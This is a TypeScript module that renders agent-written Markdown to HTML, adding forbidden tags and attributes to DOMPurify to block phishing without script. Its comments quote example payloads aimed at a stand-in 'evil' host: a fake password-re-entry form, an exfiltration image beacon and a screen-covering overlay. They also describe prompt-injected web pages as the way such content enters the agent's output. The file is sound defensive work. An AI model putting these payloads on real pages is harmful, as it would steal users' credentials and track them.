/**
 * AItelier Markdown Renderer — safe Markdown-to-HTML conversion.
 *
 * Ported from web/js/utils.js renderMarkdown (IIFE → TypeScript ES module).
 * Uses `marked.parse()` then `DOMPurify.sanitize()` for XSS protection.
 * Falls back to HTML-escaped plain text when either dependency is absent.
 */

import { marked } from 'marked';

// GFM task lists render as `<input type=checkbox disabled>`, and the sanitizer
// below forbids `input` — correctly, because `<input type="password">` inside
// agent-authored markdown is the phishing case this whole config exists for.
// Stripping the tag silently made `- [x] gate passed` and `- [ ] gate failed`
// render IDENTICALLY, which inverts meaning rather than degrading it, in
// exactly the documents where it matters: the Verifier writes its gate reports
// in that shape. So the checkbox becomes a character before it ever reaches the
// sanitizer, and `input` stays forbidden.
marked.use({
  renderer: {
    checkbox(this: unknown, checked: boolean | { checked: boolean }): string {
      const on = typeof checked === 'object' ? checked.checked : checked;
      return on ? '\u2611\uFE0F ' : '\u2610 ';
    },
  },
});
import createDOMPurify from 'dompurify';
import { escapeHtml } from './format';

// dompurify's default export is an initialized instance only when a global
// window existed at module-eval time (browser bundle). Under vitest/SSR it
// is an UNBOUND FACTORY — `.sanitize` is undefined, so every render threw
// and silently fell back to escaped plain text. Bind it to the current
// window explicitly; with no DOM at all, renderMarkdown falls back safely.
type Sanitizer = { sanitize(html: string, cfg?: Record<string, unknown>): string };
const DOMPurify: Sanitizer | null =
  typeof (createDOMPurify as unknown as Sanitizer).sanitize === 'function'
    ? (createDOMPurify as unknown as Sanitizer)
    : typeof window !== 'undefined'
      ? (createDOMPurify as unknown as (w: Window) => Sanitizer)(window)
      : null;

// DOMPurify's defaults stop SCRIPT EXECUTION, which is what they are for, and
// they are correct: probed against this exact version, `<script>`,
// `javascript:`/`data:` hrefs, every `on*` handler, `<iframe srcdoc>`,
// `<base>`, `<meta http-equiv=refresh>`, `<button formaction>`, SVG `<use>`,
// `<math actiontype>` and both mXSS shapes are all neutralized, and `target`
// is stripped so reverse-tabnabbing is impossible.
//
// What the defaults do NOT stop is a page that lies. These survive unchanged:
//
//   <form action="https://evil/"><input type="password"
//         placeholder="Session expired — re-enter your password"><button>
//   <img src="https://evil/track.png?who=1">           (an exfil beacon)
//   <div style="position:fixed;inset:0;z-index:99999"> (a full-viewport overlay)
//
// That matters here more than in a normal app: everything rendered through this
// function was written by an agent that reads the open web with web_search /
// web_fetch, so a prompt-injected page is the delivery vector — and the
// dashboard is served to anonymous strangers. Phishing does not need script.
//
// Remote <img> is deliberately NOT handled here; `img-src 'self' data:` in the
// CSP (api/main.py) kills it at the layer that can actually see the request.
const SANITIZE_CONFIG = {
  FORBID_TAGS: ['form', 'input', 'button', 'select', 'option', 'textarea',
                'label', 'fieldset', 'legend'],
  FORBID_ATTR: ['style', 'formaction', 'action', 'srcset', 'ping', 'autofocus'],
};

/**
 * Safely render Markdown text to an HTML string.
 *
 * @param text — raw Markdown input (string, null, or undefined)
 * @returns safe HTML string (empty string for null/undefined/empty input)
 */
export function renderMarkdown(text: string | null | undefined): string {
  if (text == null || text === '') {
    return '';
  }

  const textStr = String(text);

  if (!DOMPurify) {
    // No DOM available to sanitize against — escaped plain text is the only
    // safe output.
    return escapeHtml(textStr);
  }

  try {
    const html = marked.parse(textStr) as string;
    return DOMPurify.sanitize(html, SANITIZE_CONFIG);
  } catch {
    // Fallback: escape HTML entities
    return escapeHtml(textStr);
  }
}
